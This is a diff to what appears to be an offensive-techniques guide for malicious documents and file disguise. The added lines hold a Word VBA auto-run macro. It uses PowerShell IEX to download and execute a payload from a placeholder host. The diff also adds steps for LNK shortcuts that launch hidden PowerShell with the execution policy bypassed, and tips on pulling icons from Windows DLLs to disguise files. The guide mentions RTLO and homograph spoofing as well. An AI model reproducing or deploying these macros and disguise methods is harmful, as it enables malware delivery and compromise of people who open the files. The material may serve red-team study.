@@ -31,18 +31,17 @@ To make a new macro, go to "View" -> "Macros" -> "View Macros" -> "Create" (you 
 
 When saving your file, go to `Save As` and save it as a `Word Macro-Enabled Document (*.docm)`
 ```
+Sub Auto_Open()
+    Dim exec As String
+    Dim testvar As String
+    exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('http://0.0.0.0/payload.txt'))"""
+    Shell (exec)
+End Sub
 Sub AutoOpen()
-    Dim Command As String
-    Dim TempFolder As String
-
-    ' Get the path of the temp folder
-    TempFolder = Environ$("temp")
-
-    ' Define the command to download the file
-    Command = "cmd /c certutil -urlcache -split -f ""http://example.com/file.txt"" """ & TempFolder & "\file.txt"""
-
-    ' Run the command
-    Call Shell(Command, vbHide)
+    Auto_Open
+End Sub
+Sub Workbook_Open()
+    Auto_Open
 End Sub
 ```
 
@@ -65,6 +64,16 @@ The RTLO character can be used to reverse the display of text that follows it. F
 
 Get the character here: <https://unicode-explorer.com/c/202E>
 
+## LNK files
+Make a shortcut file by right-clicking and selecting "New&rarr;Shortcut"
+When asked for the program you would like to use, you can have it run a powershell command like:
+
+>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "[Malicious PowerShell Script Here]"
+
+## Using the .ico files on the windows system
+These two folders contain a lot of ico files for you to use
++ Windows/System32/shell32.dll
++ Windows/System32/imageres.dll
 ## watcher_1.exe malware
 
 ## Homographic attacks
